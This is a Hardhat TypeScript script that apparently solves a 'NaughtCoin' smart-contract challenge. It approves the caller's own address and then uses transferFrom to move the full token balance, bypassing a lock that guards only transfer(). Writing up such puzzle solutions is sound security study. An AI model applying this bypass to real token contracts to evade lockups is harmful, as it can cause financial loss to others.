import { ethers } from "hardhat";
import { NaughtCoin__factory } from "../typechain/factories/contracts/NaughtCoin__factory";

async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address = "0xC805565D97972497469f466eac6024E68831e848";
    let naughtCoin = new NaughtCoin__factory(signer).attach(instance_address);
    console.log(await naughtCoin.balanceOf(signer.address));
    

    let tx = await naughtCoin.approve(signer.address, naughtCoin.balanceOf(signer.address));
    await tx.wait();
    tx = await naughtCoin.transferFrom(signer.address, instance_address, naughtCoin.balanceOf(signer.address));
    await tx.wait();
    console.log(await naughtCoin.balanceOf(signer.address));

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
